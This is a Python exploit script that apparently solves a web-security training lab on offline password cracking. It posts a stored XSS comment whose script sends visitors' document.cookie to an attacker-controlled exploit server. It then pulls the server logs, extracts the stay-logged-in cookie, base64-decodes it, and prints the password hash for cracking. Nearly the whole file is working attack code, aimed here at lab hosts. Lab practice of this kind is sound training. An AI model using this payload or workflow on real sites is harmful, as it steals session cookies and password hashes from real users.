##############################################################
#
# Lab: Offline password cracking
#
# Hack Steps: 
#      1. Post a comment with a malicious XSS payload
#      2. Fetch the exploit sever logs
#      3. Extract the encoded cookie from logs
#      4. Decode the encoded cookie
#      5. Crack this hash using any online hash cracker
#
##############################################################
import requests
import re
from colorama import Fore
import base64

# Change this to your lab URL
LAB_URL = "https://0ae400f6039431158017ad75000000c8.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a24000a030c31e980ceacb401330049.exploit-server.net"

def main():
    print("⦗1⦘ Posting a comment with a malicious XSS payload.. ", end="", flush=True)

    posting_comment_with_malicious_xss_payload() 
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Fetching the exploit sever logs.. ", end="", flush=True)
    
    log_page = fetch("/log")
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Extracting the encoded cookie from logs.. ", end="", flush=True)

    cookie_encoded = get_cookie_from_logs(log_page) 
       
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Decoding the encoded cookie.. ", end="", flush=True)
    
    cookie_decoded = base64.b64decode(cookie_encoded).decode() 
    hash = cookie_decoded.split(":")[1] 

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Password hash: " + Fore.GREEN + hash)
    print(Fore.WHITE + "⦗#⦘ Crack this hash using any online hash cracker")
    

def posting_comment_with_malicious_xss_payload():
    data = {
        "postId": "2",
        "comment": f"<script>fetch('{EXPLOIT_SERVER_URL}/exploit?cookie=' + document.cookie)</script/> Exploited!",
        "name": "Hacker",
        "email": "hacker@hacker.me",
        "website": ""
    }
    post_data("/post/comment", data)
    

def get_cookie_from_logs(log_page):
    cookie_encoded = re.findall("stay-logged-in=(.*) HTTP", log_page.text)
    
    if len(cookie_encoded) != 0:
        return cookie_encoded[0]
    else:
        print(Fore.RED + "⦗!⦘ No cookies are found is the logs")
        exit(1)
    

def fetch(path):
    try:  
        return requests.get(f"{EXPLOIT_SERVER_URL}{path}", allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()